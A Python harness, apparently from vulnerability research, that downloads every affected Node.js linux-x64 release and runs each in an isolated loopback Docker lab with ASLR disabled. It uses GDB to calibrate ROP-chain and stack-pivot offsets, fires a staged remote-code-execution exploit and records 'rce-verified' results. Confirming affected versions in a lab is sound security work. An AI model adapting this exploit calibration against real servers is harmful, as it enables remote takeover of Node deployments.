#!/usr/bin/env python3
"""Verify every officially affected Node release in the isolated local lab.

The runner downloads official linux-x64 archives, verifies SHASUMS256, derives
binary-specific ROP facts, performs a read-only GDB address calibration with
ASLR disabled, and accepts only the bundled /n2s nonce + id proof returned on
the exploited loopback request socket.
"""

from __future__ import annotations

import argparse
import copy
from datetime import datetime, timezone
import hashlib
import importlib.util
import json
import os
from pathlib import Path
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import time
import urllib.request


ROOT = Path(__file__).parents[1]
PROFILE_DIR = ROOT / "poc" / "profiles"
EVIDENCE_DIR = ROOT / "evidence" / "matrix"
WORK_PARENT = Path(
    os.environ.get("N2S_MATRIX_WORKDIR", str(Path.home() / "node2shell-matrix"))
)
INDEX_PATH = WORK_PARENT / "index.json"
DOCKER = os.environ.get("N2S_DOCKER", shutil.which("docker") or "/snap/bin/docker")
IMAGE = "node2shell-nonce-local:matrix"
CONTAINER = "node2shell-matrix-current"
DIST_BASE = "https://nodejs.org/dist"
FIXED = {22: (22, 23, 4), 24: (24, 22, 1), 26: (26, 12, 1)}
CAL_PATTERN = re.compile(
    r"N2S_CAL ring=(0x[0-9a-f]+) source=(0x[0-9a-f]+) "
    r"saved=(0x[0-9a-f]+) dest=(0x[0-9a-f]+)"
)


def load_module(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


POC = load_module("node2shell_lab", ROOT / "poc" / "node2shell_lab.py")
ANALYZER = load_module("profile_node_binary", ROOT / "tools" / "profile_node_binary.py")


def semver(value: str) -> tuple[int, int, int]:
    match = re.fullmatch(r"v?(\d+)\.(\d+)\.(\d+)", value)
    if match is None:
        raise ValueError(f"invalid Node version: {value}")
    return tuple(int(part) for part in match.groups())  # type: ignore[return-value]


def official_scope() -> list[str]:
    WORK_PARENT.mkdir(parents=True, exist_ok=True)
    if not INDEX_PATH.exists():
        download(f"{DIST_BASE}/index.json", INDEX_PATH)
    records = json.loads(INDEX_PATH.read_text(encoding="utf-8"))
    versions: list[str] = []
    for record in records:
        parsed = semver(str(record["version"]))
        if parsed[0] in FIXED and parsed < FIXED[parsed[0]] and "linux-x64" in record["files"]:
            versions.append(".".join(str(part) for part in parsed))
    return sorted(set(versions), key=semver)


def sha256_file(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as source:
        for block in iter(lambda: source.read(1024 * 1024), b""):
            digest.update(block)
    return digest.hexdigest()


def download(url: str, target: Path) -> None:
    last_error: Exception | None = None
    for attempt in range(1, 4):
        try:
            request = urllib.request.Request(url, headers={"User-Agent": "Node2Shell-lab-matrix/1"})
            with urllib.request.urlopen(request, timeout=90) as response, target.open("wb") as output:
                while block := response.read(1024 * 1024):
                    output.write(block)
            return
        except Exception as error:  # network errors vary by Python/OpenSSL build
            last_error = error
            target.unlink(missing_ok=True)
            if attempt < 3:
                time.sleep(attempt)
    assert last_error is not None
    raise last_error


def fetch_official_binary(version: str, directory: Path) -> tuple[Path, str, str]:
    archive_name = f"node-v{version}-linux-x64.tar.xz"
    release_url = f"{DIST_BASE}/v{version}"
    sums = directory / "SHASUMS256.txt"
    archive = directory / archive_name
    download(f"{release_url}/SHASUMS256.txt", sums)
    download(f"{release_url}/{archive_name}", archive)
    expected = None
    for line in sums.read_text(encoding="utf-8").splitlines():
        fields = line.split()
        if len(fields) == 2 and fields[1].lstrip("*") == archive_name:
            expected = fields[0]
            break
    if expected is None:
        raise RuntimeError(f"official checksum is missing for {archive_name}")
    actual = sha256_file(archive)
    if actual != expected:
        raise RuntimeError(f"archive SHA256 mismatch: expected {expected}, got {actual}")
    member = f"node-v{version}-linux-x64/bin/node"
    subprocess.run(
        ["tar", "-xJf", str(archive), "--strip-components=2", "-C", str(directory), member],
        check=True,
    )
    binary = directory / "node"
    if not binary.is_file():
        raise RuntimeError("official archive did not yield bin/node")
    return binary, expected, f"{release_url}/{archive_name}"


def docker(*arguments: str, check: bool = True) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [DOCKER, *arguments],
        check=check,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )


def stop_container() -> None:
    docker("rm", "-f", CONTAINER, check=False)


def start_container(binary: Path) -> None:
    stop_container()
    completed = docker(
        "run",
        "--platform", "linux/amd64",
        "-d",
        "--name", CONTAINER,
        "--label", "org.openai.node2shell-lab=true",
        "--read-only",
        "--tmpfs", "/tmp:rw,noexec,nosuid,size=16m",
        "--cap-drop", "ALL",
        "--security-opt", "no-new-privileges",
        "--security-opt", "seccomp=unconfined",
        "--pids-limit", "128",
        "--memory", "512m",
        "--cpus", "1.0",
        "--network", "host",
        "-e", "N2S_DISABLE_ASLR=1",
        "-v", f"{binary}:/usr/local/bin/node:ro",
        IMAGE,
    )
    if not completed.stdout.strip():
        raise RuntimeError("Docker did not return a container id")


def node_pid() -> int:
    output = docker("top", CONTAINER, "-eo", "pid,args").stdout
    matches = re.findall(r"^\s*(\d+)\s+node /app/server\.js\s*$", output, re.MULTILINE)
    if len(matches) != 1:
        raise RuntimeError(f"unexpected docker top output: {output!r}")
    return int(matches[0])


def wait_ready(profile, timeout: float = 12.0) -> bytes:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        token = POC.health_token(1.0)
        if token is not None:
            return token
        time.sleep(0.1)
    raise RuntimeError("isolated lab did not become healthy")


def first_free_fd(pid: int) -> int:
    used = {int(path.name) for path in Path(f"/proc/{pid}/fd").iterdir() if path.name.isdigit()}
    candidate = 3
    while candidate in used:
        candidate += 1
    return candidate


def initial_profile(analysis: dict[str, object], version: str):
    raw = ANALYZER.poc_profile(analysis, version)
    major = semver(version)[0]
    initial = {
        22: ("0x3e0", "0x3d1ef7c8", "0x7fffb8003bf8"),
        24: ("0x360", "0x550e0748", "0x7fffa0003c10"),
        26: ("0x210", "0x5506c5f8", "0x7fffa0003c10"),
    }[major]
    raw.update(
        {
            "id": f"node-{version}-express-5.3.0-bookworm-x86_64-nonce-proof-v4",
            "chain_version": 4,
            "pivot_mode": "saved_rbp_leave",
            "leave_ret": analysis["leave_ret"],
            "distance_symbol": 191,
            "window_bits": 10,
            "copy_source_offset": initial[0],
            "staged_positions": [initial[1]],
            "ring_base": initial[2],
            "bootstrap_prefix_offset": "0x27",
            "rax_base_prefix_offset": "0x17",
            "decoder_compat_chain_offset": "0x3f",
            "decoder_compat_proof_offset": "0xa7",
            "accepted_socket_fd": 22,
        }
    )
    return POC.Profile(raw)


def gdb_expression(value: str) -> str:
    if value == "state+0x88":
        return "*(void**)($rbx+0x88)"
    if value == "r8+rax":
        return "$r8+$rax"
    if re.fullmatch(r"r(?:ax|bx|cx|dx|si|di|8|9|10|11|12|13|14|15)", value):
        return "$" + value
    raise RuntimeError(f"unsupported calibration expression: {value}")


def wait_gdb_armed(process: subprocess.Popen[str], timeout: float = 12.0) -> list[str]:
    assert process.stdout is not None
    lines: list[str] = []
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        line = process.stdout.readline()
        if line:
            lines.append(line)
            if "Breakpoint 1 at" in line:
                return lines
        elif process.poll() is not None:
            break
    raise RuntimeError("GDB did not arm the vulnerable-copy breakpoint")


def calibrate(profile, binary: Path, pid: int) -> dict[str, int | str]:
    raw = profile.raw
    source = "$" + str(raw["copy_source_register"])
    destination = gdb_expression(str(raw["copy_destination_expression"]))
    ring = gdb_expression(str(raw["copy_ring_expression"]))
    script = "\n".join(
        (
            "set pagination off",
            "set confirm off",
            "set debuginfod enabled off",
            f"break *{profile.n('copy_breakpoint'):#x}",
            "commands 1",
            "  silent",
            (
                '  printf "N2S_CAL ring=%p source=%p saved=%p dest=%p\\n", '
                f"{ring}, {source}, $rbp+8, {destination}"
            ),
            "  detach",
            "  quit",
            "end",
            "continue",
            "",
        )
    )
    with tempfile.NamedTemporaryFile("w", encoding="utf-8", suffix=".gdb") as commands:
        commands.write(script)
        commands.flush()
        debugger = subprocess.Popen(
            ["gdb", "-q", "-batch", str(binary), "-p", str(pid), "-x", commands.name],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        prefix = wait_gdb_armed(debugger)
        first = POC.build_stage_one(profile)
        initial_position = int(raw["staged_positions"][0], 0)
        second = POC.build_stage_two(initial_position, profile.n("second_stage_size"))
        try:
            POC.send_stages(first, second, float(raw["stage_delay_seconds"]), 8.0)
        except OSError:
            pass
        try:
            remainder, _ = debugger.communicate(timeout=12)
        finally:
            if debugger.poll() is None:
                debugger.terminate()
                try:
                    debugger.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    debugger.kill()
        transcript = "".join(prefix) + remainder
    match = CAL_PATTERN.search(transcript)
    if match is None:
        raise RuntimeError("GDB returned no calibration record: " + transcript[-2000:].replace("\n", " | "))
    ring_value, source_value, saved, destination_value = (int(value, 16) for value in match.groups())
    target = saved - 8
    delta = target - destination_value
    position = (initial_position + delta) & 0xFFFFFFFF
    source_offset = (source_value - ring_value + delta) % 0x400
    if source_offset > 0x3F0:
        raise RuntimeError(f"calibrated source pair crosses the physical ring end: {source_offset:#x}")
    return {
        "ring": ring_value,
        "observed_source": source_value,
        "observed_destination": destination_value,
        "saved_return_slot": saved,
        "target_saved_rbp_slot": target,
        "position": position,
        "source_offset": source_offset,
        "transcript_tail": transcript[-1200:],
    }


def overlaps(left: tuple[int, int], right: tuple[int, int]) -> bool:
    return left[0] < right[1] and right[0] < left[1]


def choose_layout(source_offset: int, chain_qwords: int) -> dict[str, str]:
    source = (source_offset, source_offset + 16)
    layouts = (
        (0x17, 0x27, 0x3F, 0xA7),
        (0x117, 0x127, 0x13F, 0x1A7),
        (0x1E7, 0x1F7, 0x20F, 0x277),
        (0x287, 0x297, 0x2AF, 0x317),
        (0x337, 0x347, 0x35F, 0x3C7),
    )
    for rax_base, bootstrap, chain, proof in layouts:
        regions = (
            (bootstrap, bootstrap + 24),
            (chain, chain + chain_qwords * 8),
            (proof, proof + 5),
        )
        if max(end for _start, end in regions) > 1031:
            continue
        if any(overlaps(source, region) for region in regions):
            continue
        if overlaps(regions[0], regions[1]) or overlaps(regions[1], regions[2]):
            continue
        if proof - rax_base != 0x90:
            continue
        return {
            "rax_base_prefix_offset": f"0x{rax_base:x}",
            "bootstrap_prefix_offset": f"0x{bootstrap:x}",
            "decoder_compat_chain_offset": f"0x{chain:x}",
            "decoder_compat_proof_offset": f"0x{proof:x}",
        }
    raise RuntimeError(f"no non-overlapping controlled-prefix layout for source {source_offset:#x}")


def save_json(path: Path, value: object) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, ensure_ascii=False, indent=2, sort_keys=True) + "\n", encoding="utf-8")


def verify_one(version: str) -> dict[str, object]:
    print(f"MATRIX version={version} phase=download", flush=True)
    with tempfile.TemporaryDirectory(prefix=f"v{version}-", dir=WORK_PARENT) as temporary:
        directory = Path(temporary)
        binary, archive_sha, archive_url = fetch_official_binary(version, directory)
        analysis = ANALYZER.extract(binary)
        profile = initial_profile(analysis, version)
        print(f"MATRIX version={version} phase=calibrate", flush=True)
        start_container(binary)
        try:
            wait_ready(profile)
            calibration_pid = node_pid()
            calibration = calibrate(profile, binary, calibration_pid)
            raw = copy.deepcopy(profile.raw)
            raw["ring_base"] = f"0x{int(calibration['ring']):x}"
            raw["copy_source_offset"] = f"0x{int(calibration['source_offset']):x}"
            raw["staged_positions"] = [f"0x{int(calibration['position']):x}"]
            chain_qwords = 12 + int(raw.get("execvp_base_padding", 0))
            raw.update(choose_layout(int(calibration["source_offset"]), chain_qwords))
            profile = POC.Profile(raw)

            token = wait_ready(profile)
            active_pid = node_pid()
            raw["accepted_socket_fd"] = first_free_fd(active_pid)
            profile = POC.Profile(raw)
            PROFILE_DIR.mkdir(parents=True, exist_ok=True)
            save_json(PROFILE_DIR / f"{version}.json", raw)

            print(
                f"MATRIX version={version} phase=verify position={raw['staged_positions'][0]} "
                f"source={raw['copy_source_offset']} fd={raw['accepted_socket_fd']}",
                flush=True,
            )
            result = POC.run(profile, 8, 15.0)
            result.update(
                {
                    "version": version,
                    "verification_mode": "official-linux-x64-aslr-disabled-isolated-docker",
                    "official_archive_url": archive_url,
                    "official_archive_sha256": archive_sha,
                    "node_binary_sha256": analysis["node_binary_sha256"],
                    "calibration": {
                        "ring_base": f"0x{int(calibration['ring']):x}",
                        "observed_source": f"0x{int(calibration['observed_source']):x}",
                        "observed_destination": f"0x{int(calibration['observed_destination']):x}",
                        "saved_return_slot": f"0x{int(calibration['saved_return_slot']):x}",
                        "target_saved_rbp_slot": f"0x{int(calibration['target_saved_rbp_slot']):x}",
                        "copy_source_offset": raw["copy_source_offset"],
                        "staged_position": raw["staged_positions"][0],
                        "accepted_socket_fd": raw["accepted_socket_fd"],
                    },
                    "lab_controls": {
                        "target": "127.0.0.1:3000",
                        "read_only_rootfs": True,
                        "cap_drop": "ALL",
                        "no_new_privileges": True,
                        "proof_program": "/n2s (fixed nonce + /usr/bin/id)",
                    },
                    "calibration_token_before_verify": token.decode(),
                    "verified_at": datetime.now(timezone.utc).isoformat(),
                }
            )
            return result
        finally:
            stop_container()


def write_summary(scope: list[str]) -> dict[str, object]:
    verified: list[str] = []
    failed: dict[str, str] = {}
    for version in scope:
        path = EVIDENCE_DIR / f"{version}.json"
        if not path.exists():
            failed[version] = "missing evidence"
            continue
        try:
            record = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError) as error:
            failed[version] = f"invalid evidence: {error}"
            continue
        if record.get("result") == "rce-verified":
            verified.append(version)
        else:
            failed[version] = str(record.get("error", record.get("result", "unknown")))
    summary = {
        "official_affected_linux_x64_release_count": len(scope),
        "rce_verified_count": len(verified),
        "rce_verified_versions": verified,
        "failed_or_unverified": failed,
        "complete": len(verified) == len(scope),
        "generated_at": datetime.now(timezone.utc).isoformat(),
    }
    save_json(EVIDENCE_DIR / "summary.json", summary)
    return summary


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--version", action="append", help="verify only this exact release")
    parser.add_argument("--limit", type=int, help="process at most N selected releases")
    parser.add_argument("--include-verified", action="store_true")
    args = parser.parse_args()
    scope = official_scope()
    selected = args.version or scope
    unknown = sorted(set(selected) - set(scope), key=semver)
    if unknown:
        parser.error("outside official affected scope: " + ", ".join(unknown))
    if not args.include_verified:
        selected = [
            version
            for version in selected
            if not (
                (EVIDENCE_DIR / f"{version}.json").exists()
                and json.loads((EVIDENCE_DIR / f"{version}.json").read_text(encoding="utf-8")).get("result")
                == "rce-verified"
            )
        ]
    if args.limit is not None:
        selected = selected[: args.limit]
    failures = 0
    for version in selected:
        evidence_path = EVIDENCE_DIR / f"{version}.json"
        try:
            result = verify_one(version)
        except Exception as error:
            result = {
                "version": version,
                "result": "not-verified",
                "error": f"{type(error).__name__}: {error}",
                "verified_at": datetime.now(timezone.utc).isoformat(),
            }
            print(f"MATRIX version={version} phase=error error={result['error']}", file=sys.stderr, flush=True)
            stop_container()
        save_json(evidence_path, result)
        print(f"MATRIX version={version} result={result['result']}", flush=True)
        if result.get("result") != "rce-verified":
            failures += 1
    summary = write_summary(scope)
    print(json.dumps(summary, ensure_ascii=False, indent=2), flush=True)
    return 1 if failures else 0


if __name__ == "__main__":
    raise SystemExit(main())
